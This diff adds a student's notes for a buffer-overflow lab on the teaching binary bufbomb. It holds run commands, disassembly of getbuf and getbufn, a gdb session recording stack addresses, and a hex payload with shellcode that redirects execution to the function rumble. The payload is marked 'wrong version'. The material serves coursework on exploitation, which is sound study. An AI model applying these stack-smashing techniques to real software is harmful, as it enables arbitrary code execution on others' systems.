@@ -1,0 +1,219 @@
+./makecookie 191830173
+0x4dd9cc21
+
+leave
+    mov %ebp,%esp;
+    pop %ebp 
+
+ret
+    pop %eip
+
+cat solution.txt | ./hex2raw | ./bufbomb -u [userid]
+
+./hex2raw < solution.txt > solution-raw.txt
+./bufbomb -u [userid] < solution-raw.txt
+
+gcc -m32 -c example.S
+objdump -d example.o > example.d
+
+gdb bufbomb
+(gdb) run -u [userid] < solution-raw.txt
+------------------------------------------------------------------------------
+
+0804956a <test>:
+ 804956a:	55                   	push   %ebp
+ 804956b:	89 e5                	mov    %esp,%ebp
+ 804956d:	83 ec 18             	sub    $0x18,%esp
+ 8049570:	e8 4c 04 00 00       	call   80499c1 <uniqueval>
+ 8049575:	89 45 f0             	mov    %eax,-0x10(%ebp)
+ 8049578:	e8 ba 06 00 00       	call   8049c37 <getbuf> (%esp: 0x55682f38)
+ 804957d:	89 45 f4             	mov    %eax,-0xc(%ebp)
+ 8049580:	e8 3c 04 00 00       	call   80499c1 <uniqueval>
+ 8049585:	89 c2                	mov    %eax,%edx
+ 8049587:	8b 45 f0             	mov    -0x10(%ebp),%eax
+ 804958a:	39 c2                	cmp    %eax,%edx
+ 804958c:	74 12                	je     80495a0 <test+0x36>
+ 804958e:	83 ec 0c             	sub    $0xc,%esp
+ 8049591:	68 40 b1 04 08       	push   $0x804b140
+ 8049596:	e8 85 fb ff ff       	call   8049120 <puts@plt>
+ ...
+
+08049c37 <getbuf>:
+ 8049c37:	55                   	push   %ebp
+ 8049c38:	89 e5                	mov    %esp,%ebp
+ 8049c3a:	83 ec 48             	sub    $0x48,%esp
+ 8049c3d:	83 ec 0c             	sub    $0xc,%esp
+ 8049c40:	8d 45 bf             	lea    -0x41(%ebp),%eax
+ 8049c43:	50                   	push   %eax
+ 8049c44:	e8 b9 fa ff ff       	call   8049702 <Gets>
+ 8049c49:	83 c4 10             	add    $0x10,%esp
+ 8049c4c:	b8 01 00 00 00       	mov    $0x1,%eax
+ 8049c51:	c9                   	leave  
+ 8049c52:	c3                   	ret    
+
+0804950d <rumble>:
+ 804950d:	55                   	push   %ebp
+ 804950e:	89 e5                	mov    %esp,%ebp
+ 8049510:	83 ec 08             	sub    $0x8,%esp
+ 8049513:	a1 e0 d1 04 08       	mov    0x804d1e0,%eax
+ 8049518:	83 ec 08             	sub    $0x8,%esp
+ 804951b:	50                   	push   %eax
+ 804951c:	ff 75 08             	pushl  0x8(%ebp)
+ 804951f:	e8 7a ff ff ff       	call   804949e <eval2equal>
+ 8049524:	83 c4 10             	add    $0x10,%esp
+ 8049527:	85 c0                	test   %eax,%eax
+ ...
+
+0804949e <eval2equal>:
+...
+ 80494cf:	8d 85 61 ff ff ff    	lea    -0x9f(%ebp),%eax
+ 80494d5:	01 d0                	add    %edx,%eax
+ 80494d7:	89 45 f4             	mov    %eax,-0xc(%ebp)
+ 80494da:	83 ec 04             	sub    $0x4,%esp
+ 80494dd:	ff 75 0c             	pushl  0xc(%ebp)
+ 80494e0:	68 f3 b0 04 08       	push   $0x804b0f3
+ 80494e5:	ff 75 f4             	pushl  -0xc(%ebp)
+ 80494e8:	e8 13 fd ff ff       	call   8049200 <sprintf@plt>
+ 80494ed:	83 c4 10             	add    $0x10,%esp
+ 80494f0:	83 ec 04             	sub    $0x4,%esp
+ 80494f3:	6a 09                	push   $0x9
+ 80494f5:	ff 75 f4             	pushl  -0xc(%ebp)
+ 80494f8:	ff 75 08             	pushl  0x8(%ebp)
+ 80494fb:	e8 b0 fb ff ff       	call   80490b0 <memcmp@plt>
+ 8049500:	83 c4 10             	add    $0x10,%esp
+ 8049503:	85 c0                	test   %eax,%eax
+ 8049505:	0f 94 c0             	sete   %al
+ 8049508:	0f b6 c0             	movzbl %al,%eax
+ 804950b:	c9                   	leave  
+ 804950c:	c3                   	ret    
+
+08049c53 <getbufn>:
+ 8049c53:	55                   	push   %ebp
+ 8049c54:	89 e5                	mov    %esp,%ebp
+ 8049c56:	81 ec f8 02 00 00    	sub    $0x2f8,%esp
+ 8049c5c:	83 ec 0c             	sub    $0xc,%esp
+ 8049c5f:	8d 85 0a fd ff ff    	lea    -0x2f6(%ebp),%eax
+ 8049c65:	50                   	push   %eax
+ 8049c66:	e8 97 fa ff ff       	call   8049702 <Gets>
+ 8049c6b:	83 c4 10             	add    $0x10,%esp
+ 8049c6e:	b8 01 00 00 00       	mov    $0x1,%eax
+ 8049c73:	c9                   	leave  
+ 8049c74:	c3                   	ret    
+
+
+(gdb) b *0x08049c66
+Breakpoint 1 at 0x8049c66
+(gdb) r -n -u 191830173 < kaboom-raw.txt
+Starting program: /home/usr/ICSlab/buflab/bufbomb -n -u 191830173 < kaboom-raw.txt
+Userid: 191830173
+Cookie: 0x4dd9cc21
+
+Breakpoint 1, 0x08049c66 in getbufn ()
+(gdb) info r
+eax            0x55682c1a          1432890394
+ecx            0x0                 0
+edx            0x0                 0
+ebx            0xffffd050          -12208
+esp            0x55682c08          0x55682c08 <_reserved+1035272>
+ebp            0x55682f10          0x55682f10 <_reserved+1036048>
+esi            0xf7fb3000          -134533120
+edi            0xf7fb3000          -134533120
+eip            0x8049c66           0x8049c66 <getbufn+19>
+eflags         0x216               [ PF AF IF ]
+cs             0x23                35
+ss             0x2b                43
+ds             0x2b                43
+es             0x2b                43
+fs             0x0                 0
+gs             0x63                99
+(gdb) c
+Continuing.
+Type string:KABOOM!: getbufn returned 0x4dd9cc21
+Keep going
+
+Breakpoint 1, 0x08049c66 in getbufn ()
+(gdb) info r
+eax            0x55682c6a          1432890474
+ecx            0x0                 0
+edx            0x0                 0
+ebx            0xffffd050          -12208
+esp            0x55682c58          0x55682c58 <_reserved+1035352>
+ebp            0x55682f60          0x55682f60 <_reserved+1036128>
+esi            0xf7fb3000          -134533120
+edi            0xf7fb3000          -134533120
+eip            0x8049c66           0x8049c66 <getbufn+19>
+eflags         0x216               [ PF AF IF ]
+cs             0x23                35
+ss             0x2b                43
+ds             0x2b                43
+es             0x2b                43
+fs             0x0                 0
+gs             0x63                99
+(gdb) c
+Continuing.
+Type string:Dud: getbufn returned 0x1
+
+Breakpoint 1, 0x08049c66 in getbufn ()
+(gdb) info r
+eax            0x55682bca          1432890314
+ecx            0x0                 0
+edx            0x0                 0
+ebx            0xffffd050          -12208
+esp            0x55682bb8          0x55682bb8 <_reserved+1035192>
+ebp            0x55682ec0          0x55682ec0 <_reserved+1035968>
+esi            0xf7fb3000          -134533120
+edi            0xf7fb3000          -134533120
+eip            0x8049c66           0x8049c66 <getbufn+19>
+eflags         0x212               [ AF IF ]
+cs             0x23                35
+ss             0x2b                43
+ds             0x2b                43
+es             0x2b                43
+fs             0x0                 0
+gs             0x63                99
+(gdb) c
+Continuing.
+Type string:Dud: getbufn returned 0x1
+
+Breakpoint 1, 0x08049c66 in getbufn ()
+(gdb) info r
+eax            0x55682c8a          1432890506
+ecx            0x0                 0
+edx            0x0                 0
+ebx            0xffffd050          -12208
+esp            0x55682c78          0x55682c78 <_reserved+1035384>
+ebp            0x55682f80          0x55682f80 <_reserved+1036160>
+esi            0xf7fb3000          -134533120
+edi            0xf7fb3000          -134533120
+eip            0x8049c66           0x8049c66 <getbufn+19>
+eflags         0x212               [ AF IF ]
+cs             0x23                35
+ss             0x2b                43
+ds             0x2b                43
+es             0x2b                43
+fs             0x0                 0
+gs             0x63                99
+
+------------------------------------------------------
+wrong version
+rumble
+00 00 00 00 
+00 00 00 00 
+00 00 00 00 
+00 00 00 00 
+00 00 00 00 
+00 00 00 00 
+00 00 00 00 
+00 00 00 00 
+00 00 00 00 
+00 00 00 00 
+00 00 00 00 
+00 00 00 00
+34 64 64 39 63 63 32 31 /* test string */
+8d 25 1e 2f 68 55       /* lea string to esp */
+54                      /* push   esp */
+68 0d 95 04 08       	/* push   $0x804950d */
+c3                   	/* ret */
+27 2f 68 55             /* 0x55682f38 - 17*/
+
+-------------------------------------------------------
